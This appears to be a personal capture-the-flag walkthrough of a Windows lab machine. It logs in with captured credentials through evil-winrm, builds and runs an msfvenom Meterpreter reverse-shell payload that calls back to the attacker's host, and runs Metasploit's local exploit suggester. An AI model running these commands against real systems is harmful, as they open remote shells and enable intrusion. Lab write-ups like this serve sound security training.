- Now that we have `fsmith`and `hsmith`credentials, we can use `evil-winrm`

# Evil-Winrm
---
- `evil-winrm -i 10.10.10.175  -u fsmith -p Thestrokes23`
	- ![[Pasted image 20250424211136.png]]

# Enumeration
---
- Get a `meterpreter shell`:
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.25 lport=443 -f exe -o rev.exe`
	- Set same options on `msfconsole`and run
	- Upload `rev.exe`using `evil-winrm`upload and run it
	- ![[Pasted image 20250424213919.png]]
- Using `exploit_suggestor`:
	- `use post/multi/recon/local_exploit_suggester`
	- `set session 1`
	- `run`
	- ![[Pasted image 20250424214021.png]]
- **After searching the windows version, `CVE-2024-40449`** appeared repeatedly:
	- ![[Pasted image 20250424214105.png]]